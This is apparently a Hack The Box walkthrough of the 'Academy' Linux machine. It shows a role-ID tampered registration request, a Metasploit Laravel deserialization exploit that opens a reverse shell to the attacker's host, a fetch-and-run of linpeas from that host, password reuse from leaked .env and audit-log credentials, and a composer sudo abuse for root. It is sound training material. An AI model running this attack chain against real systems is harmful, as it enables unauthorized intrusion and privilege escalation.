---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - Laravel
  - PHP
  - RoleIDManipulation
  - LaravelTokenDeserialization
  - PasswordReuse
  - Credentials
  - AuditLog
  - sudo
  - SudoAbuse
  - composer
  - GTFOBins
---

![](images/Academy.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Initial Access](#Initial-Access)
    - [User Registration and Role Manipulation](#User-Registration-and-Role-Manipulation)
    - [Directory Enumeration](#Directory-Enumeration)
    - [Admin Panel Access](#Admin-Panel-Access)
    - [Virtual Host Discovery](#Virtual-Host-Discovery)
    - [Laravel Environment File Exposure](#Laravel-Environment-File-Exposure)
    - [Laravel Token Deserialization using Metasploit](#Laravel-Token-Deserialization-using-Metasploit)
- [Enumeration (www-data)](#Enumeration-www-data)
    - [Database Configuration Discovery](#Database-Configuration-Discovery)
- [Privilege Escalation to cry0l1t3](#Privilege-Escalation-to-cry0l1t3)
    - [Password Reuse](#Password-Reuse)
- [user.txt](#usertxt)
- [Enumeration (cry0l1t3)](#Enumeration-cry0l1t3)
    - [Privilege Enumeration using linpeas](#Privilege-Enumeration-using-linpeas)
- [Privilege Escalation to mrb3n](#Privilege-Escalation-to-mrb3n)
    - [Audit Log Password Discovery](#Audit-Log-Password-Discovery)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [composer sudo Abuse](#composer-sudo-Abuse)
- [root.txt](#roottxt)

## Summary

The box starts with `SSH` on port `22/TCP` and `HTTP` on port `80/TCP`. The initial `Nmap` scan reveals a `virtual host` configuration requiring `academy.htb` to be added to `/etc/hosts`.

The application allows user registration which can be exploited by intercepting the registration request with `Burp Suite` and modifying the `roleid` parameter from `0` to `1`. This grants administrative privileges to the newly created account.

Directory enumeration using `Gobuster` reveals an `/admin.php` endpoint. Logging in with the elevated account exposes a development subdomain `dev-staging-01.academy.htb`. This staging environment leaks `Laravel` database credentials and the `APP_KEY` through an exposed error page.

Using `Metasploit` to exploit `Laravel Token Deserialization` grants initial access as `www-data`. Enumeration of `/var/www/html/academy/` reveals a `.env` file containing the database password `mySup3rP4s5w0rd!!` which is successfully reused for the `cry0l1t3` user account.

Running `linpeas.sh` discovers credentials in an audit log file revealing the password `mrb3n_Ac@d3my!` for the `mrb3n` user. The `mrb3n` user has `sudo` privileges to execute `/usr/bin/composer` without a password. By leveraging the command execution feature in `composer` documented on `GTFOBins` root access is achieved.

## Reconnaissance

### Port Scanning

We began with our initial port scan using `Nmap` which revealed `SSH` on port `22/TCP` and `HTTP` on port `80/TCP`.

```shell
$ sudo nmap -A -T4 -sC -sV -oN initial 10.10.10.215
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 14:12 CET
Nmap scan report for 10.10.10.215
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/15%OT=22%CT=1%CU=44343%PV=Y%DS=2%DC=T%G=Y%TM=5FD8B6
OS:41%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   31.79 ms 10.10.14.1
2   32.35 ms 10.10.10.215

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
```

The `Nmap` scan revealed a redirect to `http://academy.htb/` indicating a `virtual host` configuration. We added the hostname to our `/etc/hosts` file.

```shell
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.215    academy.htb
```

### Enumeration of Port 80/TCP

After adding the hostname we accessed the web application. In the upper right corner the website displayed `LOGIN` and `REGISTER` links both pointing to `.php` endpoints.

- [http://academy.htb/login.php](http://academy.htb/login.php)
- [http://academy.htb/register.php](http://academy.htb/register.php)

We registered a test account to explore the application functionality.

| Username | Password |
| -------- | -------- |
| test     | test     |

After logging in we enumerated the available features but found nothing immediately exploitable in the standard user interface.

## Initial Access

### User Registration and Role Manipulation

We decided to intercept the registration request using `Burp Suite` to examine the parameters being sent to the server.

| Username | Password |
| -------- | -------- |
| testuser | testuser |

The original registration request revealed an interesting parameter:

```
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://academy.htb
DNT: 1
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=li0pnb6rt1ro9rtc5spb6ji8qj
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uid=testuser&password=testuser&confirm=testuser&roleid=0
```

The `roleid=0` parameter suggested a privilege level system. We modified the request to set `roleid=1` in an attempt to create an account with elevated privileges.

```
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://academy.htb
DNT: 1
Connection: close
Referer: http://academy.htb/register.php
Cookie: PHPSESSID=li0pnb6rt1ro9rtc5spb6ji8qj
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

uid=testuser&password=testuser&confirm=testuser&roleid=1
```

The registration completed successfully creating an account with the modified role.

| Username | Password |
| -------- | -------- |
| testuser | testuser |

### Directory Enumeration

Since the login and registration pages used `.php` extensions we performed directory enumeration using `Gobuster` to discover additional PHP endpoints.

```shell
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb/ -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://academy.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/12/15 14:25:36 Starting gobuster
===============================================================
/login.php (Status: 200)
/register.php (Status: 200)
/admin.php (Status: 200)
/config.php (Status: 200)
/home.php (Status: 302)
/index.php (Status: 200)
```

Directory enumeration revealed an `/admin.php` endpoint which appeared to be an administrative interface.

### Admin Panel Access

We accessed the admin panel and attempted to log in with our elevated `testuser` account.

- [http://academy.htb/admin.php](http://academy.htb/admin.php)

The credentials successfully authenticated to the administrative interface confirming our role manipulation was effective.

### Virtual Host Discovery

The admin panel displayed a section titled "Academy Launch Planner" which revealed a development subdomain:

- `dev-staging-01.academy.htb`

We added this subdomain to our `/etc/hosts` file.

```shell
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.215    academy.htb dev-staging-01.academy.htb
```

### Laravel Environment File Exposure

Accessing the staging subdomain displayed a `Laravel` error page which exposed sensitive configuration information including the application key and database credentials.

- [http://dev-staging-01.academy.htb](http://dev-staging-01.academy.htb)

The error page revealed:
- Framework: `Laravel`
- `APP_KEY`: `base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=`
- Database credentials in the environment variables

### Laravel Token Deserialization using Metasploit

With the `APP_KEY` obtained from the error page we searched for `Laravel` exploits in `Metasploit`.

```shell
$ msfconsole -q
msf6 > search laravel

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_exec

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
```

We configured the exploit with the necessary parameters.

```shell
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts 10.10.10.215
rhosts => 10.10.10.215
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
app_key => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lhost 10.10.14.14
lhost => 10.10.14.14
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lport 9001
lport => 9001
```

We verified the configuration before running the exploit.

```shell
msf6 exploit(unix/http/laravel_token_unserialize_exec) > options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                           Required  Description
   ----       ---------------                           --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  yes       The base64 encoded APP_KEY string from the .env file
   Proxies                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                        yes       The target port (TCP)
   SSL        false                                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                         yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT  9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

We executed the exploit to gain initial access.

```shell
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.14:9001
[*] Command shell session 1 opened (10.10.14.14:9001 -> 10.10.10.215:35854) at 2022-01-04 14:36:43 +0100

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The exploit successfully granted command execution as `www-data`. We upgraded the shell to a fully interactive TTY.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@academy:/var/www/html/htb-academy-dev-01/public$ ^Z
[1]+  Stopped                 nc -lnvp 9001
$ stty raw -echo
$ fg
[Enter]
[Enter]
www-data@academy:/var/www/html/htb-academy-dev-01/public$ export TERM=xterm
```

## Enumeration (www-data)

### Database Configuration Discovery

We began enumerating the web directories to identify potential privilege escalation paths.

```shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd /var/www/html
www-data@academy:/var/www/html$ ls -la
total 24
drwxr-xr-x  6 root     root     4096 Nov  3 14:11 .
drwxr-xr-x  3 root     root     4096 Aug 13  2020 ..
drwxr-xr-x  2 root     root     4096 Aug 13  2020 academy
drwxr-xr-x 12 www-data www-data 4096 Aug 13  2020 htb-academy-dev-01
-rw-r--r--  1 root     root     5525 Aug 13  2020 index.html
drwxr-xr-x  4 root     root     4096 Aug 13  2020 playsms
```

We explored the `academy` directory which contained the main application files.

```shell
www-data@academy:/var/www/html$ cd academy
www-data@academy:/var/www/html/academy$ ls -la
total 68
drwxr-xr-x 2 root     root      4096 Aug 13  2020 .
drwxr-xr-x 6 root     root      4096 Nov  3 14:11 ..
-rw-r--r-- 1 www-data www-data 13827 Aug 13  2020 academy.sql
-rw-r--r-- 1 www-data www-data   937 Aug 13  2020 admin.php
-rw-r--r-- 1 www-data www-data  2633 Aug 13  2020 admin-panel.php
-rw-r--r-- 1 www-data www-data  1812 Aug 13  2020 config.php
-rw-r--r-- 1 www-data www-data   108 Aug 13  2020 .env
-rw-r--r-- 1 www-data www-data  1396 Aug 13  2020 home.php
-rw-r--r-- 1 www-data www-data 11521 Aug 13  2020 index.php
-rw-r--r-- 1 www-data www-data  3228 Aug 13  2020 login.php
-rw-r--r-- 1 www-data www-data    60 Aug 13  2020 logout.php
-rw-r--r-- 1 www-data www-data  3645 Aug 13  2020 register.php
```

The `.env` file contained database credentials.

```shell
www-data@academy:/var/www/html/academy$ cat .env
APP_NAME=Laravel
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

| Username | Password           |
| -------- | ------------------ |
| dev      | mySup3rP4s5w0rd!! |

We identified potential target users by examining `/etc/passwd`.

```shell
www-data@academy:/var/www/html/academy$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
mrb3n:x:1001:1001::/home/mrb3n:/bin/bash
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/bash
21y4d:x:1003:1003::/home/21y4d:/bin/bash
ch4p:x:1004:1004::/home/ch4p:/bin/bash
g0blin:x:1005:1005::/home/g0blin:/bin/bash
```

The system had multiple user accounts including `mrb3n` and `cry0l1t3`.

## Privilege Escalation to cry0l1t3

### Password Reuse

We tested the database password against the identified user accounts to check for password reuse.

```shell
www-data@academy:/var/www/html/academy$ su cry0l1t3
Password: mySup3rP4s5w0rd!!
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

The password was successfully reused for the `cry0l1t3` account. We upgraded the shell for better usability.

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
cry0l1t3@academy:/var/www/html/academy$
```

## user.txt

```shell
cry0l1t3@academy:~$ cat user.txt
3b75e32e93ad929b58c6df7b4f5d3b99
```

## Enumeration (cry0l1t3)

We performed basic privilege enumeration for the `cry0l1t3` user.

```shell
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

The user belonged to the `adm` group which grants access to log files. We checked sudo privileges.

```shell
cry0l1t3@academy:~$ sudo -l
[sudo] password for cry0l1t3: mySup3rP4s5w0rd!!

Sorry, user cry0l1t3 may not run sudo on academy.
```

The user had no sudo privileges.

### Privilege Enumeration using linpeas

We decided to run `linpeas.sh` for comprehensive privilege escalation enumeration.

- [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

We downloaded `linpeas.sh` on our attack machine.

```shell
$ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
--2022-01-04 14:57:17--  https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/bc6d3b1c-520c-4377-a509-4e644fc1be3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220104%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220104T145658Z&X-Amz-Expires=300&X-Amz-Signature=172521501316838b10b005f01243c96038be77616cf75fe5233a0f8a3a5efecf&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2022-01-04 14:57:17--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/bc6d3b1c-520c-4377-a509-4e644fc1be3f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220104%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220104T145658Z&X-Amz-Expires=300&X-Amz-Signature=172521501316838b10b005f01243c96038be77616cf75fe5233a0f8a3a5efecf&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 762836 (745K) [application/octet-stream]
Saving to: 'linpeas.sh'

linpeas.sh                                                 100%[=======================================================================================================================================>] 744.96K  --.-KB/s    in 0.1s

2022-01-04 14:57:18 (5.84 MB/s) - 'linpeas.sh' saved [762836/762836]
```

We started a `Python HTTP Server` to serve the file.

```shell
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On the target we downloaded and executed `linpeas.sh` in `/dev/shm/`.

```shell
cry0l1t3@academy:/dev/shm$ wget http://10.10.14.14/linpeas.sh
--2022-01-04 15:03:55--  http://10.10.14.14/linpeas.sh
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 762836 (745K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 744.96K  1.39MB/s    in 0.5s

2022-01-04 15:03:55 (1.39 MB/s) - 'linpeas.sh' saved [762836/762836]

cry0l1t3@academy:/dev/shm$ chmod +x linpeas.sh
cry0l1t3@academy:/dev/shm$ ./linpeas.sh
```

## Privilege Escalation to mrb3n

### Audit Log Password Discovery

The `linpeas.sh` output revealed interesting entries in the audit logs.

```
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```

The audit log contained credentials for the `mrb3n` user.

| Username | Password        |
| -------- | --------------- |
| mrb3n    | mrb3n_Ac@d3my! |

We authenticated via `SSH` using the discovered credentials.

```shell
$ ssh mrb3n@10.10.10.215
mrb3n@10.10.10.215's password: mrb3n_Ac@d3my!
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 04 Jan 2022 03:17:22 PM UTC

  System load:  0.0                Processes:               241
  Usage of /:   38.6% of 13.72GB   Users logged in:         0
  Memory usage: 26%                IPv4 address for ens160: 10.10.10.215
  Swap usage:   0%


89 updates can be installed immediately.
42 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Feb  9 14:20:36 2021
mrb3n@academy:~$
```

We performed basic privilege enumeration for the new user.

```shell
mrb3n@academy:~$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
```

We checked the sudo configuration.

```shell
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

The user could execute `/usr/bin/composer` with root privileges.

## Privilege Escalation to root

### composer sudo Abuse

`GTFOBins` documented a method to spawn a shell from `composer` using its package script execution feature.

- [https://gtfobins.github.io/gtfobins/composer/](https://gtfobins.github.io/gtfobins/composer/)

We used the restricted environment technique to avoid potential issues. We created a temporary directory and crafted a malicious `composer.json` file.

```shell
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
```

We executed `composer` with sudo privileges pointing to our malicious configuration.

```shell
mrb3n@academy:~$ sudo /usr/bin/composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
```

The exploit successfully spawned a root shell.

## root.txt

```shell
# cat /root/root.txt
0239a863e6da74ccc2e10e9e3a0073e8
```
